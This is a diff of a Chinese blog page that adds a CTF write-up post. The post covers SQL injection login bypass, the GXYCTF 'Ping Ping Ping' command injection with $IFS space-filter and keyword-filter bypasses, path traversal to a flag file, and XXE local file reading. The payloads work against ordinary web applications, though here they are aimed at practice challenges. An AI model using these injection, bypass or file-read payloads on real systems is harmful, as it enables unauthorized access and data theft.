@@ -147,6 +147,182 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/11/16/answer/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="qyt">
+      <meta itemprop="description" content="不要放弃自由去选择保障，到头来你两者都得不到">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="24kmagic">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2025/11/16/answer/" class="post-title-link" itemprop="url">未命名</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2025-11-16 22:03:15 / 修改时间：21:57:01" itemprop="dateCreated datePublished" datetime="2025-11-16T22:03:15+08:00">2025-11-16</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h1><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>1.账号密码登陆题目</p>
+<p>方法一：万能账户密码<br>判断闭合方式后就可以套公式啦</p>
+<p>sql语句：<br>1.原本：随便输入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT*FROM table_name WHERE username=&#x27; a&#x27; and password=&#x27;123&#x27;;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>2.我们要做的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT*FROM table_name WHERE username=&#x27;      a&#x27; or ture #     &#x27; and password=&#x27;123&#x27;;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>当输入   a’ or ture #<br>整句话会被解析成：    </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx一堆被闭合的垃圾话xx       or ture </span><br></pre></td></tr></table></figure>
+
+
+<p>（一个成立即为真）<br>那么就通关了</p>
+<p>这里有一个问题：为什么账号和密码只要一个填了万能公式就可以成功？<br>你先想一下：账号填了这个万能公式，密码填的明明是错的为什么可以对？</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT*FROM table_name WHERE username=&#x27;      a&#x27;        or ture          #     &#x27; and password=&#x27;123&#x27;;</span><br></pre></td></tr></table></figure>
+
+
+<p>即使密码是错的，但是被注释掉了<br>只要整个语句的值是真的就欧克</p>
+<p>所以当我们密码用万能时，语句变成：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT*FROM table_name WHERE username=&#x27; a&#x27; and password=&#x27; a&#x27;     or true    	  #&#x27;;</span><br></pre></td></tr></table></figure>
+
+
+<p>你说你输什么用户能让这句话错吗？nonononono</p>
+<h2 id="GXYCTF2019-Ping-Ping-Ping-1-题解"><a href="#GXYCTF2019-Ping-Ping-Ping-1-题解" class="headerlink" title="[GXYCTF2019]Ping Ping Ping 1 题解"></a>[GXYCTF2019]Ping Ping Ping 1 题解</h2><p>&#x2F;?ip&#x3D;<br>提示我们输入关于ip的命令，明显就是ping喽<br>url后加127.0.0.1，ping通了</p>
+<p>然后ls，会发现直接显示出了flag.php<br>尝试cat查看，发现显示<br>&#x2F;?ip&#x3D; fxck your space!<br>啥玩意，明显不让我们看，为什么呢？因为space空格，那我们替换空格。用可以填写能够代替空的某些专业术语就行</p>
+<p>1、命令绕过空格方法有：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$&#123;IFS&#125;$9</span><br><span class="line">&#123;IFS&#125;</span><br><span class="line">$IFS</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$1 //$1改成$加其他数字貌似都行</span><br><span class="line">IFS</span><br><span class="line">&lt; </span><br><span class="line">&lt;&gt; </span><br><span class="line">&#123;cat,flag.php&#125;  //用逗号实现了空格功能，需要用&#123;&#125;括起来</span><br><span class="line">%20   (space)</span><br><span class="line">%09   (tab)</span><br><span class="line">X=$&#x27;cat\x09./flag.php&#x27;;$X       （\x09表示tab，也可以用\x20）</span><br></pre></td></tr></table></figure>
+
+
+
+<p>2.有时会禁用cat:<br>解决方法是使用tac反向输出命令：</p>
+<p>这个真的很有趣，比如内容是1，2，3<br>tac输出的是3，2，1<br>我觉得好可爱</p>
+<p>切入正题：</p>
+<p>输入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?ip=127.0.0.1;cat$IFS$1flag.php</span><br></pre></td></tr></table></figure>
+
+
+
+<p>得到：<br>&#x2F;?ip&#x3D; fxck your flag!<br>诶哟，怎么flag也不行<br>那就制造一个不一样的flag<br>需要用到变量，比如</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;a=g;fla$a</span><br></pre></td></tr></table></figure>
+
+
+<p>试试看：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php</span><br></pre></td></tr></table></figure>
+
+
+<p>得到flag</p>
+<h2 id="这个靶场登不进去了，先不写了"><a href="#这个靶场登不进去了，先不写了" class="headerlink" title="这个靶场登不进去了，先不写了"></a>这个靶场登不进去了，先不写了</h2><p>进入后显示：<br>Give me your flag, I will tell you if the flag is right.</p>
+<p>1;desc <code>FLAG_TABLE</code><br>得：Nonono.<br>1;show column from <code>FLAG_TABLE</code><br>得：Nonono.</p>
+<h2 id="moectf-2025-05-第五章-打上门来！"><a href="#moectf-2025-05-第五章-打上门来！" class="headerlink" title="moectf 2025 05 第五章 打上门来！"></a>moectf 2025 05 第五章 打上门来！</h2><p>题目关键词：穿梭在文件目录</p>
+<p>即 在文件目录中寻找flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./ 当前目录</span><br><span class="line">../上一级目录</span><br></pre></td></tr></table></figure>
+
+<p>在当前目录发现给我们的所有内容中并没有flag，说明：在这些文件目录的下一级</p>
+<p>于是我们输入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../flag</span><br></pre></td></tr></table></figure>
+
+<p>错了</p>
+<p>寻找是否在 下一级目录的下一级中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../../falg</span><br></pre></td></tr></table></figure>
+
+<p>以此类推</p>
+<p>直到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../../../../../../../flag</span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+<p>典型的 XXE 注入漏洞 题目</p>
+<p>知识点准备：</p>
+<ol>
+<li><p>XXE：XML 外部实体注入（当成sql注入看就行）</p>
+</li>
+<li><p>XML：&lt;标签&gt; 格式</p>
+</li>
+<li><p>file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;………….</p>
+<p>linux结构</p>
+</li>
+</ol>
+<p>通用格式</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE 任意名字 [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY 实体名 <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///文件绝对路径&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">网站接收的标签名</span>&gt;</span>&amp;实体名;<span class="tag">&lt;/<span class="name">网站接收的标签名</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>第一步：</p>
+<p>一进去发现有个大方框让你提交东西，随便写一个啥提交，得到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;b&gt;Warning&lt;/b&gt;:  DOMDocument::loadXML(): Start tag expected, &#x27;&amp;lt;&#x27; not found in Entity, line: 1 in &lt;b&gt;/var/www/html/chapter10.php&lt;/b&gt; on line &lt;b&gt;17&lt;/b&gt;&lt;br /&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;阵枢&gt;引魂玉&lt;/阵枢&gt;</span><br><span class="line">&lt;解析&gt;未定义&lt;/解析&gt;</span><br><span class="line">&lt;输出&gt;未定义&lt;/输出&gt;</span><br></pre></td></tr></table></figure>
+
+<p>分析：</p>
+<p>1.<b>Warning</b>:  DOMDocument::loadXML(): Start tag expected, ‘&lt;’ not found in Entity</p>
+<p>说明：第一，我们没有按照他所希望的格式注入：’&lt;’（也就是’&amp;lt’）</p>
+<p>2.&lt;输出&gt;未定义&lt;&#x2F;输出&gt;</p>
+<p>说明：第二，很明显了，格式是xml</p>
+<p>第二，我们需要在这里获取flag内容</p>
+<p>所以，这个会被后面用到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;网站要求的标签&gt;&amp;x;&lt;/网站要求的标签&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>3.&#x2F;var&#x2F;www&#x2F;html&#x2F;chapter10.php</p>
+<p>很明显，linux文件夹结构，也许flag就在这里面</p>
+<p>可以改成：&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.txt</p>
+<p>第二步：</p>
+<p>输入对应格式的注入，拿到flag</p>
+<p>固定格式：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE 任意名字 [<span class="meta">&lt;!ENTITY 实体名 <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///文件绝对路径&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">网站接收的标签名</span>&gt;</span>&amp;实体名;<span class="tag">&lt;/<span class="name">网站接收的标签名</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<!DOCTYPE A [
+<!ENTITY x SYSTEM "file:///要读的文件路径">
+<p>]&gt;<br>&lt;网站要求的标签&gt;&x;&lt;&#x2F;网站要求的标签&gt;</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span>  //可以不写</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE 输出 [<span class="meta">&lt;!ENTITY <span class="keyword">flag</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///var/www/html/flag.txt&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">输出</span>&gt;</span><span class="symbol">&amp;flag;</span><span class="tag">&lt;/<span class="name">输出</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2025/11/12/explainable3/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -702,7 +878,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">6</span>
+          <span class="site-state-item-count">7</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
